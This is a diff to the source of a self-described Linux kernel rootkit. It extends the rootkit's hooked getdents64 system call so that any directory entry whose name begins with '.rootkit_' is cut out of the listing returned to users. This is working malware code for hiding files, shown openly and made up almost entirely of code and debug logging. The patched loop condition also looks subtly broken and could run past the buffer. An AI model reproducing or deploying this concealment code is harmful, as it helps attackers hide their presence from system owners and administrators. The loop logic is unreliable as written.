@@ -20,6 +20,9 @@ MODULE_AUTHOR("[AUTHOR 1], [AUTHOR 2], [AUTHOR 3], [AUTHOR 4]");
 MODULE_DESCRIPTION("A Linux kernel rootkit");
 MODULE_VERSION("0.1");
 
+static char S_HIDDEN_PREFIX[] = ".rootkit_";
+#define SZ_HIDDEN_PREFIX_LEN (sizeof(S_HIDDEN_PREFIX) - 1)
+
 static int __init rootkit_init(void)
 {
     int i_err = 0;
@@ -179,11 +182,13 @@ SYSCALL_HOOK_HANDLER3(getdents, orig_getdents, p_regs, unsigned int, ui32_fd,
 SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd,
                       struct linux_dirent64 __user *, p_dirent, unsigned int, ui32_count)
 {
-    long l_ret = 0; // Return value of the real syscall
-    long l_err = 0; // Error code of the copy functions
+    long l_ret               = 0; // Return value of the real syscall
+    long l_err               = 0; // Error code of the copy functions
+    long l_move_len          = 0; // Length of the data to move
+    unsigned short us_reclen = 0; // Length of the current directory entry
 
     struct linux_dirent64 *p_dirent_k    = NULL; // Kernel buffer
-    struct linux_dirent64 *p_dirent_k_it = NULL; // Kernel buffer iterator
+    struct linux_dirent64 *p_dirent_k_it = NULL; // Directory entry array iterator
 
     pr_info("[ROOTKIT] getdents64(%u, %p, %u)", ui32_fd, p_dirent, ui32_count);
 
@@ -214,12 +219,38 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
         return l_ret;
     }
 
-    pr_info("[ROOTKIT] * Entries:");
+    pr_info("[ROOTKIT] * Directory entries:");
 
     p_dirent_k_it = p_dirent_k;
-    while ((char *)p_dirent_k_it < (char *)p_dirent_k + l_ret) {
+    while ((char *)p_dirent_k_it < (char *)p_dirent_k + l_ret || p_dirent_k_it->d_reclen == 0) {
         pr_info("[ROOTKIT]   * %s", p_dirent_k_it->d_name);
-        p_dirent_k_it = (struct linux_dirent64 *)((char *)p_dirent_k_it + p_dirent_k_it->d_reclen);
+        pr_info("[ROOTKIT]     * Iter: %p, l_ret: %ld", p_dirent_k_it, l_ret);
+
+        us_reclen = p_dirent_k_it->d_reclen;
+        pr_info("[ROOTKIT]     * reclen: %hu", us_reclen);
+
+        // Check if the current directory entry has to be hidden
+        if (!strncmp(p_dirent_k_it->d_name, S_HIDDEN_PREFIX, SZ_HIDDEN_PREFIX_LEN)) {
+            pr_info("[ROOTKIT]     * Hiding directory entry");
+
+            // If this is the last directory entry, we have nothing special to do
+            if ((char *)p_dirent_k_it + us_reclen < (char *)p_dirent_k + l_ret) {
+                // The current directory entry is not the last one, so we have to move the next
+                // directory entries to the current position
+                l_move_len = l_ret - ((char *)p_dirent_k_it - (char *)p_dirent_k) - us_reclen;
+                pr_info("[ROOTKIT]     * Moving %ld bytes", l_move_len);
+                memmove(p_dirent_k_it, (char *)p_dirent_k_it + us_reclen, l_move_len);
+            }
+
+            // Decrease the total length
+            l_ret -= us_reclen;
+        } else {
+            // Update the iterator to the next directory entry
+            p_dirent_k_it = (struct linux_dirent64 *)((char *)p_dirent_k_it + us_reclen);
+        }
+
+        pr_info("[ROOTKIT]     > Iter: %p, l_ret: %ld, reclen: %hu", p_dirent_k_it, l_ret,
+                p_dirent_k_it->d_reclen);
     }
 
     // Copy data back to user
